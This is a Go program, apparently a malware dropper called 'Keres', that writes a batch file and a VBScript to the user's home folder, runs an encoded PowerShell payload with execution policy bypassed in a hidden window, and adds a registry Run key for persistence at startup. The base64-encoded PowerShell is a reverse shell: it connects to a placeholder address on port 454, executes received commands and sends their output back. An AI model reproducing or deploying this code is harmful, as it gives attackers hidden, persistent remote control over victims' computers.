package main

import (
    "fmt"
    "io/ioutil"
    "os"
    "os/exec"
    "syscall"
    "path/filepath"
)

func main() {
    // Define environment variables and paths
    homeDir, err := os.UserHomeDir()
    if err != nil {
        fmt.Println("Error getting user home directory:", err)
        return
    }
    batchFilePath := filepath.Join(homeDir, "Keres.bat")
    vbsScriptPath := filepath.Join(homeDir, "ExecKeres.vbs")

    encodedPSCmd := "CgAkAHUAbgBpAHEAdQBlAEkAZABlAG4AdABpAGYAaQBlAHIAIAA9ACAAIgBLAGUAcgBlAHMAIgAKACQAbQBhAHgAUAByAG8AYwBlAHMAcwBlAHMAIAA9ACAAMQAKACQAcwBwAGEAdwBuAGUAZABQAHIAbwBjAGUAcwBzAGUAcwAgAD0AIAAwAAoACgB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsACgAgACAAIAAgACQAaQBzAFIAdQBuAG4AaQBuAGcAIAA9ACAARwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAgAHwAIABXAGgAZQByAGUALQBPAGIAagBlAGMAdAAgAHsAIAAkAF8ALgBDAG8AbQBtAGEAbgBkAEwAaQBuAGUAIAAtAGwAaQBrAGUAIAAiACoAJAB1AG4AaQBxAHUAZQBJAGQAZQBuAHQAaQBmAGkAZQByACoAIgAgAH0ACgAKACAAIAAgACAAaQBmACAAKAAtAG4AbwB0ACAAJABpAHMAUgB1AG4AbgBpAG4AZwAgAC0AYQBuAGQAIAAkAHMAcABhAHcAbgBlAGQAUAByAG8AYwBlAHMAcwBlAHMAIAAtAGwAdAAgACQAbQBhAHgAUAByAG8AYwBlAHMAcwBlAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABjAG8AbgBuAGUAYwB0AGkAbwBuAFQAZQBzAHQAIAA9ACAAVABlAHMAdAAtAEMAbwBuAG4AZQBjAHQAaQBvAG4AIAAtAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAAJwAwAC4AMAAuADAALgAwACcAIAAtAEMAbwB1AG4AdAAgADEAIAAtAFEAdQBpAGUAdAAKAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABjAG8AbgBuAGUAYwB0AGkAbwBuAFQAZQBzAHQAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABQAFMASABPAE0ARQBcAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHUAbgBpAHEAdQBlAEkAZABlAG4AdABpAGYAaQBlAHIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAByAHkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAYwBsAGkAZQBuAHQALgBDAG8AbgBuAGUAYwB0ACgAJwAwAC4AMAAuADAALgAwACcALAAgADQANQA0ACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApAAoACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoAC0AbgBvAHQAIAAkAGMAbABpAGUAbgB0AC4AQwBvAG4AbgBlAGMAdABlAGQAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEMAbwBuAG4AZQBjAHQAaQBvAG4AIABsAG8AcwB0AC4AIABSAGUAYwBvAG4AbgBlAGMAdABpAG4AZwAuAC4ALgAiAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAA2ADAAIAAgACMAIABXAGEAaQB0ACAAZgBvAHIAIAA2ADAAIABzAGUAYwBvAG4AZABzACAAYgBlAGYAbwByAGUAIABhAHQAdABlAG0AcAB0AGkAbgBnACAAdABvACAAcgBlAGMAbwBuAG4AZQBjAHQACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAcgBlAGEAawAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAYgB5AHQAZQBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABiAHkAdABlAFsAXQAgADYANQA1ADMANQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABpACAALQBsAGUAIAAwACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBDAG8AbgBuAGUAYwB0AGkAbwBuACAAdABvACAAcwBlAHIAdgBlAHIAIABjAGwAbwBzAGUAZAAuACAAUgBlAGMAbwBuAG4AZQBjAHQAaQBuAGcALgAuAC4AIgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANgAwACAAIAAjACAAVwBhAGkAdAAgAGYAbwByACAANgAwACAAcwBlAGMAbwBuAGQAcwAgAGIAZQBmAG8AcgBlACAAYQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAHIAZQBjAG8AbgBuAGUAYwB0AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHIAZQBhAGsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGQAYQB0AGEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABpACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACAAKwAgACcAPgAgACcACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAgADAALAAgACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEUAcgByAG8AcgA6ACAAJABfACIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0AIABmAGkAbgBhAGwAbAB5ACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAcwB0AHIAZQBhAG0AKQAgAHsAIAAkAHMAdAByAGUAYQBtAC4AQwBsAG8AcwBlACgAKQAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGMAbABpAGUAbgB0ACkAIAB7ACAAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4ACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwBwAGEAdwBuAGUAZABQAHIAbwBjAGUAcwBzAGUAcwArACsACgAgACAAIAAgACAAIAAgACAAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIATgBvACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAHQAbwAgAHQAaABlACAAcwBlAHIAdgBlAHIALgAgAFMAawBpAHAAcABpAG4AZwAgAHAAcgBvAGMAZQBzAHMAIABzAHAAYQB3AG4ALgAiAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlAGkAZgAgACgAJABzAHAAYQB3AG4AZQBkAFAAcgBvAGMAZQBzAHMAZQBzACAALQBnAGUAIAAkAG0AYQB4AFAAcgBvAGMAZQBzAHMAZQBzACkAIAB7AAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAE0AYQB4AGkAbQB1AG0AIABuAHUAbQBiAGUAcgAgAG8AZgAgAHAAcgBvAGMAZQBzAHMAZQBzACAAcgBlAGEAYwBoAGUAZAAuACAAUwBrAGkAcABwAGkAbgBnACAAcAByAG8AYwBlAHMAcwAgAHMAcABhAHcAbgAuACIACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBTAGMAcgBpAHAAdAAgAGkAcwAgAGEAbAByAGUAYQBkAHkAIAByAHUAbgBuAGkAbgBnAC4AIgAKACAAIAAgACAAfQAKAAoAIAAgACAAIAAjACAAQwBvAHUAbgB0ACAAcAByAG8AYwBlAHMAcwBlAHMAIABhAGYAdABlAHIAIABhACAANgAwAC0AcwBlAGMAbwBuAGQAIAB3AGEAaQB0AAoAIAAgACAAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAA2ADAACgAgACAAIAAgACQAcwBwAGEAdwBuAGUAZABQAHIAbwBjAGUAcwBzAGUAcwAgAD0AIAAoAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIAB7ACAAJABfAC4AQwBvAG0AbQBhAG4AZABMAGkAbgBlACAALQBsAGkAawBlACAAIgAqACQAdQBuAGkAcQB1AGUASQBkAGUAbgB0AGkAZgBpAGUAcgAqACIAIAB9ACkALgBDAG8AdQBuAHQACgB9AAoACgA="

    // Create VBScript content
    vbsScriptContent := fmt.Sprintf(`
Set objShell = CreateObject("WScript.Shell")
batchFilePath = "%s"
objShell.Run batchFilePath, 0, True
`, batchFilePath)

    // Create batch file content
    batchFileContent := fmt.Sprintf(`
@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand %s
`, encodedPSCmd)

    // Create VBScript file
    if err := ioutil.WriteFile(vbsScriptPath, []byte(vbsScriptContent), 0644); err != nil {
        fmt.Println("Error creating VBScript file:", err)
        return
    }
    fmt.Println("VBScript file created at:", vbsScriptPath)

    // Create batch file
    if err := ioutil.WriteFile(batchFilePath, []byte(batchFileContent), 0644); err != nil {
        fmt.Println("Error creating batch file:", err)
        return
    }

    // Execute VBScript file
    cmd := exec.Command("wscript", vbsScriptPath)
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    if err := cmd.Run(); err != nil {
        fmt.Println("Error executing VBScript file:", err)
        return
    }

    // Register the script to run at startup
    cmd = exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "/v", "Keres", "/t", "REG_SZ", "/d", vbsScriptPath, "/f")
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    if err := cmd.Run(); err != nil {
        fmt.Println("Error registering script to run at startup:", err)
        return
    }

    fmt.Println("Script executed successfully and registered to run at startup.")
}
